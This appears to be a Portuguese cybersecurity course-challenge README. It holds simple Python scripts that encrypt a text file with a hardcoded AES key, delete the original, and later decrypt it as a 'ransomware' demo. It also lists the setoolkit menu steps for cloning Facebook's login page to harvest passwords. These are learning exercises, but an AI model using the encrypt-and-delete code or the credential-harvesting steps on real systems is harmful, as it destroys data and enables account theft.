# Desafio-CiberSecurity 

## Ransomware na Prática com Python no Kali Linux

Encriptografar/descriptografar arquivo txt com código python.
-    Código decrypt
-         import os
          import pyaes
          abrir o arquivo criptografado
          file_name = "teste.txt.ransomwaretroll"
          file = open(file_name, "rb")
          file_data = file.read()
          file.close()

          chave para descriptografia
          key = b"testeransomwares"
          aes = pyaes.AESModeOfOperationCTR(key)
          decrypt_data = aes.decrypt(file_data)

          remover o arquivo criptografado
          os.remove(file_name)

          criar o arquivo descriptografado
          new_file = "teste.txt"
          new_file = open(f'{new_file}', "wb")
          new_file.write(decrypt_data)
          new_file.close()

-    Código encrypt
-         import os
          import pyaes

        abrir o arquivo a ser criptografado
        file_name = "teste.txt"
        file = open(file_name, "rb")
        file_data = file.read()
        file.close()

        remover o arquivo
        os.remove(file_name)

        chave de criptografia
        key = b"testeransomwares"
        aes = pyaes.AESModeOfOperationCTR(key)

        criptografar o arquivo
        crypto_data = aes.encrypt(file_data)

        salvar o arquivo criptografado
        new_file = file_name + ".ransomwaretroll"
        new_file = open(f'{new_file}','wb')
        new_file.write(crypto_data)
        new_file.close()
  
- Ferramentas
    - Kali Linux
- Biblioteca Python
    - Pyaes
      
# Desafio-CiberSecurity
## Pishing para captura de senhas do Facebook 

- Ferramentas
    -  Kali Linux
    -  setoolkit

# A partir do Kali Linux, configurações para o processo de captura no ataque de engenharia social

- Acesso Root : sudo su
- Iniciando setoolkit
- Tipo de ataque: Social Engineering Attacks
- Vetor de ataque: Web Site Attack Vectors
- Método de ataque: Credential Harvester Attack Method
- Método de ataque: Site Cloner
- Obtendo o endereço da máquina Ifconfig
- URL para clone: http//www.Facebook.com

  # Resultado

  ![Captura de tela 2023-08-29 140141](https://github.com/MarcelHarding/Desafio-CiberSecurity/assets/106993667/bbd19914-d8b9-4681-9e0c-a9f59d88e7e0)
